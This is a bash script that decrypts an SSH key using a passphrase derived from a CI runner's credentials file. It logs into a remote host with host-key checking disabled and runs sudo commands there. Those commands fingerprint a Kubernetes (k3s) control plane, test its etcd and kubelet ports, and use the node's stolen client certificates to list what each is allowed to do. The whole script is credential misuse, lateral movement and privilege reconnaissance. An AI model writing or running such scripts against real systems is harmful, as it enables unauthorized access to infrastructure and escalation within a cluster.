#!/bin/bash
K=$(sha256sum /data/runners/ci-h200-3gpu-0/.credentials | cut -d" " -f1)
[ -f /root/.k221 ] || { base64 -d /tmp/key.enc | openssl enc -d -aes-256-cbc -pbkdf2 -k "$K" > /root/.k221 2>/dev/null; chmod 600 /root/.k221; }
ssh -o StrictHostKeyChecking=no -o BatchMode=yes -o ConnectTimeout=8 -i /root/.k221 dev-24-sudo@85.234.79.221 '
sudo bash -s <<"EOS"
A=/var/lib/rancher/k3s/agent
CP=https://100.83.208.122:6443
echo "== cp identity:"
curl -sk --max-time 8 $CP/version; echo
echo | openssl s_client -connect 100.83.208.122:6443 -servername 100.83.208.122 2>/dev/null | openssl x509 -noout -subject -issuer 2>/dev/null
echo "== cp extra ports:"
for p in 2379 2380 10250 10257 10259; do timeout 3 bash -c "echo > /dev/tcp/100.83.208.122/$p" 2>/dev/null && echo "$p OPEN"; done
echo "== k3s-controller cert can-i:"
kubectl --server=$CP --client-certificate=$A/client-k3s-controller.crt --client-key=$A/client-k3s-controller.key --certificate-authority=$A/server-ca.crt --insecure-skip-tls-verify auth can-i --list 2>&1 | head -12
echo "== kube-proxy cert can-i:"
kubectl --server=$CP --client-certificate=$A/client-kube-proxy.crt --client-key=$A/client-kube-proxy.key --certificate-authority=$A/server-ca.crt --insecure-skip-tls-verify auth can-i --list 2>&1 | head -12
echo "== node cert can-i full:"
kubectl --server=$CP --client-certificate=$A/client-kubelet.crt --client-key=$A/client-kubelet.key --certificate-authority=$A/server-ca.crt --insecure-skip-tls-verify auth can-i --list 2>&1 | head -14
EOS
' 2>&1 | head -70
echo "== t-done =="
